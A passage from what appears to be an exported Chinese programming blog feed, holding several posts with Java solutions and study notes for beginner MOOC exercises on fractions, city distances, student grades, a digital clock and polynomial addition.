function_">Fraction</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="built_in">this</span>.a = a;</span><br><span class="line">		<span class="built_in">this</span>.b = b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Fraction <span class="title function_">plus</span><span class="params">(Fraction r)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> a * r.b + r.a * b;</span><br><span class="line">		<span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> b * r.b;</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(aa, bb);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Fraction <span class="title function_">multiply</span><span class="params">(Fraction r)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> a * r.a;</span><br><span class="line">		<span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> b * r.b;</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(aa, bb);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="type">double</span> <span class="title function_">toDouble</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> a * <span class="number">1.0</span> / b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> a, y = b, r = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (y != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = x % y;</span><br><span class="line">			x = y;</span><br><span class="line">			y = r;</span><br><span class="line">		&#125;</span><br><span class="line">		a /= x;</span><br><span class="line">		b /= x;</span><br><span class="line">		<span class="keyword">if</span> (a == b)</span><br><span class="line">			System.out.println(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			System.out.println(a + <span class="string">&quot;/&quot;</span> + b);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初学Java，按照C++中的习惯，开始的时候果断写成了下图这样&#x2F;捂脸~<br>好菜~~</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Fraction <span class="title function_">plus</span><span class="params">(Fraction r)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">aa</span> <span class="operator">=</span> a * r.b + r.a * b;</span><br><span class="line">	<span class="type">int</span> <span class="variable">bb</span> <span class="operator">=</span> b * r.b;</span><br><span class="line">	Fraction <span class="title function_">temp</span><span class="params">(aa, bb)</span>;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>面向对象程序设计_Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>第三周编程题_查找里程</title>
    <url>/posts/25475/</url>
    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>下图为国内主要城市之间的公路里程：</p>
<p><img data-src="/images/6630868754095812824.jpg"></p>
<p>你的程序要读入这样的一张表，然后，根据输入的两个城市的名称，给出这两个城市之间的里程。</p>
<p>注意：任何两个城市之间的里程都已经给出，不需要计算经第三地中转。<br>注意：你并不需要去录入上图的数据，数据是在程序输入中给的。</p>
<span id="more"></span>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>首先，你会读到若干个城市的名字。每个名字都只是一个英文单词，中间不含空格或其他符号。当读到名字为“###”（三个#号）时，表示城市名字输入结束，###并不是一个城市的名字。如果记读到的城市名字的数量为n。<br>然后，你会读到nxn的一个整数矩阵。第一行的每一个数字，表示上述城市名单中第一个城市依次到另一个城市之间的里程。表中同一个城市之间的里程为0。<br>最后，你会读到两个城市的名字。</p>
<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出这两个城市之间的距离。</p>
<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>Hagzou Hugzou Jigxng ###
0 1108 708
1108 0 994
708 994 0
Hagzou Jigxng
</p></div>

<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><div class="note default no-icon"><p>708
</p></div>

<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Third_Week</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;String&gt; city = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Integer&gt;&gt; distince = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Integer&gt;&gt;();</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 输入城市名及距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">input</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		String temp;</span><br><span class="line">		<span class="comment">// 读入城市名</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = in.next();</span><br><span class="line">			<span class="keyword">if</span> (temp.equals(<span class="string">&quot;###&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			city.add(temp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 读入距离</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; city.size(); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Integer&gt; temp_hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Integer&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; city.size(); j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">				temp_hashmap.put(city.get(j), dis);</span><br><span class="line">			&#125;</span><br><span class="line">			distince.put(city.get(i), temp_hashmap);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		in.close();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 查找两个城市间的距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(String start, String end)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		dis = distince.get(start).get(end);</span><br><span class="line">		<span class="keyword">return</span> dis;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Third_Week</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Third_Week</span>();</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		dis.input();</span><br><span class="line">		<span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> in.next();</span><br><span class="line">		<span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> in.next();</span><br><span class="line">		System.out.println(dis.search(start, end));</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>题目中给的样例有问题，有的地方多了几个空格，导致在本机测样例的时候，一直无输出，调试了半天。<br>手打了样例之后，发现要查询的两个城市的名字无法读入，怀疑是scanner关闭了两次的问题，注释掉input()方法中的<code>in.close()</code>，果然。。。<br>但是又有个warning，提示<code>input()</code>方法中的in没有关闭。强迫症，把scanner写成全局的，完美解决。<br>开始没读清题意，以为要查询多组城市间的距离，查了下Java中读到末尾的方法，学会了<code>hasnext()</code>等方法。<br>链接：<a href="http://blog.csdn.net/kejizuiqianfang/article/details/55253698">java中关于判断文本文件读到文件尾</a><br>链接：<a href="http://blog.csdn.net/wn1017888485/article/details/46039361">java使用两个scanner，关闭输入流</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>面向对象程序设计_Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>第三周讨论区_学生成绩的数据结构</title>
    <url>/posts/13223/</url>
    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>如果要写程序表达一个班级的很多个学生的很多门课的成绩，应该如何表达这些数据？</p>
<p>如果我们希望通过学生的姓名，可以找到他的所有的成绩，而每一门课的成绩，是由课程名称和分数构成的。</p>
<p>而如果我们还希望这个程序能找出某一门课的全部学生的成绩应该怎样做呢？</p>
<p>注意，并非所有的学生都参加了所有的课程。</p>
<span id="more"></span>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student_Grade</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Double&gt;&gt; studentInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Double&gt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名添加成绩</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name, String course, <span class="type">double</span> grade)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.containsKey(name))</span><br><span class="line">		&#123;</span><br><span class="line">			studentInfo.get(name).put(course, grade);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">			temp.put(course, grade);</span><br><span class="line">			studentInfo.put(name, temp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (k == name)</span><br><span class="line">			&#123;</span><br><span class="line">				temp = studentInfo.get(name);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name+<span class="string">&quot; &quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">			&#123;</span><br><span class="line">				temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> subject+<span class="string">&quot;:&quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		String temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(String k:studentInfo.keySet())</span><br><span class="line">			temp+=(k+<span class="string">&quot;:&quot;</span>+studentInfo.get(k).toString()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Student_Grade</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student_Grade</span>();</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;Java&quot;</span>, <span class="number">60.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">70.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;李四&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">80.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;王五&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">90.2</span>);</span><br><span class="line">		System.out.println(student.getScore_name(<span class="string">&quot;张三&quot;</span>));</span><br><span class="line">		System.out.println(student.getScore_subject(<span class="string">&quot;C++&quot;</span>));</span><br><span class="line">		System.out.println(student);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h2><p><img data-src="/images/20170821012136233.jpg"></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>起初，两个查询的方法如下所示，返回值是一个Hasmap&lt;String,Doubole&gt;。</p>
<p>后来在为Student_Grade写<code>toString（）</code>方法以便输出所有学生的所有成绩时，想到可以在两个查询的方法中临时建立一个String，调用<code>toString()</code>方法，赋值给它，并对该字符串进行处理，返回一个字符串。使得输出有”姓名“和”课程名“，信息更完整。（强迫症）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (k == name)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = studentInfo.get(name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">		&#123;</span><br><span class="line">			temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>面向对象程序设计_Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>第二周编程题_有秒计时的数字时钟</title>
    <url>/posts/2173/</url>
    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>&#160; &#160; &#160; &#160;这一周的编程题是需要你在课程所给的时钟程序的基础上修改而成。但是我们并不直接给你时钟程序的代码，请根据视频自己输入时钟程序的Display和Clock类的代码，然后来做这个题目。<br>&#160; &#160; &#160; &#160;我们需要给时钟程序加上一个表示秒的Display，然后为Clock增加以下public的成员函数：</p>
<span id="more"></span>

<p>public Clock(int hour, int minute, int second);<br>&#160; &#160; &#160; &#160;用hour, minute和second初始化时间。<br>public void tick();<br>&#160; &#160; &#160; &#160;“嘀嗒”一下，时间走1秒。<br>public String toString();<br>&#160; &#160; &#160; &#160;返回一个String的值，以“hh:mm:ss“的形式表示当前时间。这里每个数值都占据两位，不足两位时补0。如“00:01:22&quot;。注意其中的冒号是西文的，不是中文的。</p>
<p>提示：<code>String.format()</code>可以用和printf一样的方式来格式化一个字符串。</p>
<p>另外写一个Main类，它的main函数为下面的样子，注意，必须原封不动地作为Main的main函数：</p>
<div class="note default no-icon"><p>
public static void main(String[] args) {
java.util.Scanner in = new java.util.Scanner(System.in);
Clock clock = new Clock(in.nextInt(), in.nextInt(), in.nextInt());
clock.tick();
System.out.println(clock);
in.close();
}
</p></div>
<div class="note warning"><p>
注意！在提交的时候，把Main、Clock和Display三个类的代码合并在一起，其中Main类是public的，而Clock和Display类是没有修饰符的。另外，千万注意第一行不能有package语句。
</p></div>
## 输入格式:
采用给定的main函数无需考虑输入输出。

<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>采用给定的main函数无需考虑输入输出。</p>
<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><p>采用给定的main函数无需考虑输入输出。</p>
<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><p>采用给定的main函数无需考虑输入输出。<br><strong>时间限制：500ms内存限制：32000kb</strong></p>
<h2 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Second_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		java.util.<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(System.in);</span><br><span class="line">		<span class="type">Clock</span> <span class="variable">clock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Clock</span>(in.nextInt(), in.nextInt(), in.nextInt());</span><br><span class="line">		clock.tick();</span><br><span class="line">		System.out.println(clock);</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Display</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> <span class="variable">limit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Display</span><span class="params">(<span class="type">int</span> limit)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="built_in">this</span>.limit = limit;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setvalue</span><span class="params">(<span class="type">int</span> value)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.value = value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">increase</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">		value++;</span><br><span class="line">		<span class="keyword">if</span> (value == limit)</span><br><span class="line">		&#123;</span><br><span class="line">			value = <span class="number">0</span>;</span><br><span class="line">			temp = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getvalue</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">Display</span> <span class="variable">hour</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Display</span>(<span class="number">24</span>);</span><br><span class="line">	<span class="keyword">private</span> <span class="type">Display</span> <span class="variable">minute</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Display</span>(<span class="number">60</span>);</span><br><span class="line">	<span class="keyword">private</span> <span class="type">Display</span> <span class="variable">second</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Display</span>(<span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Clock</span><span class="params">(<span class="type">int</span> hour, <span class="type">int</span> minute, <span class="type">int</span> second)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.hour.setvalue(hour);</span><br><span class="line">		<span class="built_in">this</span>.minute.setvalue(minute);</span><br><span class="line">		<span class="built_in">this</span>.second.setvalue(second);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;%02d:%02d:%02d&quot;</span>, hour.getvalue(), minute.getvalue(), second.getvalue());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tick</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.second.increase() == <span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">this</span>.minute.increase() == <span class="literal">true</span>)</span><br><span class="line">				<span class="built_in">this</span>.hour.increase();</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		System.out.println(toString());</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没写toString()方法时，输出为：<br>面向对象程序设计_Java语言_翁恺.Clock@7d4991ad</p>
<h2 id="学习心得："><a href="#学习心得：" class="headerlink" title="学习心得："></a>学习心得：</h2><p>toString（）方法是Object类的一个实例方法，所有的Java类都是Object类的子类，故所有的Java类都有toString（）方法。<br>除此外，所有的Java类的对象都可以和字符串进行连接运算，当Java类对象和字符串进行连接运算时，系统自动调用Java对象toString（）方法的返回值和字符串进行连接操作，如：<br>&#160; &#160; &#160; &#160;String str&#x3D;p+“123”；<br>&#160; &#160; &#160; &#160;String str&#x3D;p.toString()+&quot;123&quot;;<br>toString()方法是一个非常特殊的方法，是一个“自我描述”方法，该方法通常用于实现当程序员直接打印该对象时，系统将会输出该对象的“自我描述”信息，用以告诉外界该对象具有的状态信息。<br>Object类提供的toString()方法总是返回该对象实现类的”类名+@+hashCode”值，这个返回值不能真正实现“自我描述”功能，因此我们可以重写object的toString()方法。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>面向对象程序设计_Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>第五周编程题_多项式加法</title>
    <url>/posts/51603/</url>
    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>一个多项式可以表达为x的各次幂与系数乘积的和，比如：<br>2x6+3x5+12x3+6x+20<br>现在，你的程序要读入两个多项式，然后输出这两个多项式的和，也就是把对应的幂上的系数相加然后输出。<br>程序要处理的幂最大为100。</p>
<span id="more"></span>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>总共要输入两个多项式，每个多项式的输入格式如下：<br>每行输入两个数字，第一个表示幂次，第二个表示该幂次的系数，所有的系数都是整数。第一行一定是最高幂，最后一行一定是0次幂。<br>注意第一行和最后一行之间不一定按照幂次降低顺序排列；如果某个幂次的系数为0，就不出现在输入数据中了；0次幂的系数为0时还是会出现在输入数据中。</p>
<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>从最高幂开始依次降到0幂，如：<br>2x6+3x5+12x3-6x+20<br>注意其中的x是小写字母x，而且所有的符号之间都没有空格，如果某个幂的系数为0则不需要有那项。</p>
<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>6 2
5 3
3 12
1 6
0 20
6 2
5 3
2 12
1 6
0 20
</p></div>

<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><div class="note default no-icon"><p>4x6+6x5+12x3+12x2+12x+40
</p></div>


<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 零基础学Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fifth_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">		<span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">101</span>];</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">		<span 